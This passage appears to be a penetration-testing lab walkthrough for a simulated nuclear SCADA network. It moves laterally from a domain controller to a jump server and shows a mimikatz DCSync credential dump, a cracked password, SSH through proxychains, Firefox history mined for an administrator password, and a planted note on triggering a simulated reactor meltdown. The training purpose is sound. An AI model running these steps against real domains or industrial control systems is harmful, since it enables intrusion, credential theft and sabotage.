# Lateral Movement 2 - DC to Jump-Server

- [Lateral Movement 2 - DC to Jump-Server](#lateral-movement-2---dc-to-jump-server)
  - [Recap](#recap)
  - [Local Enumeration](#local-enumeration)

----

## Recap

From user enumeration, we know there is a user called `jump-admin`.

<br/>

From computer enumeration, we know there is a computer called `jump-server`, which is listening on tcp/22 - likely a linux machine.

<br/>

Dump the credential of the user `jump-admin` using DCSync using mimikatz:

```
lsapdump::dcsync /user:nuclear\jump-admin
```

![picture 37](images/53cf60a0dec08afd0e54492b07577814d600cfaff256c6966fd758bcf79b805a.png)  

NTLM:  `2dc9bff397f9e6c9f08a05b18145a7b6`

<br/>

Checking the NTLM on crackstation:

![picture 38](images/3657d962f1ef271efd03c6642d333b4994f6a6ceca65ec5564a2484baac26bc7.png)  

- The cleartext password of `jump-admin` is `B@DB!tch`.

<br/>

Then try to use this credential to SSH to Jump-Server:

```
proxychains ssh jump-admin@10.1.1.4
```

![picture 39](images/fa8ff6a53e33d58b58f2d91d7b4268b9938bab942823c6a108fb6c5250af1e7f.png)  

- Login successfully but the user has no sudo privilege.

<br/>

## Local Enumeration

Checking the user's home, there is a file called `Core_Reactor_notes`, which contains some instructions:

![picture 40](images/1213a49f87c61f839090b956a986f469ff88d7b30ac1bf7770d0b246cf2c0757.png)  


```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


        !!This file contains important information for
        proper operation of Nuclear Core Reactor!!


Extreme focus is on the heat generated by the Nuclear Reactor &
the cooling systems used to depress the amount of heat.


Scientist must be extreme cautious when dealing with the following cases:

- Loss or inadvertant withdrawl of coolant rods.

- Loss of Electric Power (Station Blackout)

- Failure of reactor protection systems.

- Natural Calamity (Earthquakes and fire)

The most probable case would be of inadvertant withdrawl of rods. 
On the SCADA-HOST, the PCTRAN application is the control panel for monitoring
and operating Nuclear Core Reactor. 

With access to PCTRAN control panel, the following procedure can replicate 
NUCLEAR MELTDOWN in core's reactor.

Code Control > Malfunctions > set option 12 (Inadvertent Rod Withdrawl)


Modify Delay Time (5)
Failure Fraction (100)
Check the active box 


Then, RUN the application, in 5 seconds, a message "OVERFlow" appears.

CAUTION: Nuclear Meltdown could be achieved by following the above procedure. 

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

```

- This is in fact one of our objective.

<br/>

Checking the firefox browsing history, there is a cleartext credential:

```
cd ~/.mozilla/firefox/4pzgqgj4.default-release
```

```
sqlite3 places.sqlite
```

```
.tables
```

```
select * from moz_places;
```

![picture 41](images/50b9188d7197e38747a8ed8de289e8ada56ecb40595764fcb1915fdc663cef3f.png)  

- scada-host.scada.local
  - `Administrator` / `SCADAAdmin!@#$%`


<br/>

Check the hosts file:

```
cat /etc/hosts
```

![picture 42](images/b0ce9a90f57a0efa6ea04d5422e5f66840303be91b2f66091497369ba4a90fb4.png)  

- IP address of `scada-host.scada.local` is `10.2.1.1`

<br/>

